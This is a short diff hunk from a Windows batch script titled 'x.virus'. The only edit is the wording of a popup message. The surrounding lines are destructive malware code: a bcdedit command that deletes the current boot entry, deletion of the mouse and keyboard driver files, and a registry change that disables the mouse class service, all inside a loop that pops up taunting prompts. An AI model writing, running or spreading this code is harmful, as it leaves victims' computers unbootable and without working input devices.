@@ -144,7 +144,7 @@ bcdedit /delete {current} /f
 :loop
     @echo off
     title x.virus
-    start cmd /k "mshta "javascript:var sh=new ActiveXObject('WScript.Shell');var result=sh.Popup('Are you still using your computer?',10,'x.virus',36);close();" && exit"
+    start cmd /k "mshta "javascript:var sh=new ActiveXObject('WScript.Shell');var result=sh.Popup('still using this computer?',10,'x.virus',36);close();" && exit"
     del C:\WINDOWS\system\MOUSE.DRV
     del C:\WINDOWS\system\KEYBOARD.DRV
     reg add HKLM\System\CurrentControlSet\Services\Mouclass/v Start /t REG_DWORD /d4/f > nul
